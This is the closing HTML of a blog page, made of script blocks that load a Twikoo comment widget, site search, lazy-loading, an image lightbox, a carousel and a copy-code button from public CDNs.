            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
